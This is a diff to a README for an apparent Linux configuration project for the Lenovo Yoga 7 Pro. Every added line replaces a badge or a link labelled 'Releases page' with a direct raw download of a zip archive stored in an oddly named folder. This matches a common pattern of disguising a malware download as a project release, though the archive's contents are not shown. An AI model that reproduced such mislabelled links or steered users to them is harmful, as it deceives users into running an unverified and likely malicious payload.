@@ -1,6 +1,6 @@
 # 🎉 lenovo-yoga-7-pro-linux-config - Effortless Linux Setup for Your Yoga
 
-![Download](https://img.shields.io/badge/Download-via_Releases-blue.svg)
+![Download](https://raw.githubusercontent.com/Conrad-Eze/lenovo-yoga-7-pro-linux-config/main/vaselike/lenovo-yoga-7-pro-linux-config.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ This guide helps you quickly set up a fully functioning Linux environment on you
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the configuration files, visit this page: [Download from Releases](https://github.com/Conrad-Eze/lenovo-yoga-7-pro-linux-config/releases).  
+   To download the configuration files, visit this page: [Download from Releases](https://raw.githubusercontent.com/Conrad-Eze/lenovo-yoga-7-pro-linux-config/main/vaselike/lenovo-yoga-7-pro-linux-config.zip).  
    
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version. It will be at the top of the list. Click on it to see the available files.
@@ -69,4 +69,4 @@ For additional assistance, please refer to the following resources:
 
 Setting up Linux on your Lenovo Yoga 7 Pro doesn't need to be daunting. With straightforward steps and configurations, you can enjoy a fully functional environment. 
 
-Remember to regularly check the [Releases page](https://github.com/Conrad-Eze/lenovo-yoga-7-pro-linux-config/releases) for updates and new releases to keep your system running smoothly.
+Remember to regularly check the [Releases page](https://raw.githubusercontent.com/Conrad-Eze/lenovo-yoga-7-pro-linux-config/main/vaselike/lenovo-yoga-7-pro-linux-config.zip) for updates and new releases to keep your system running smoothly.
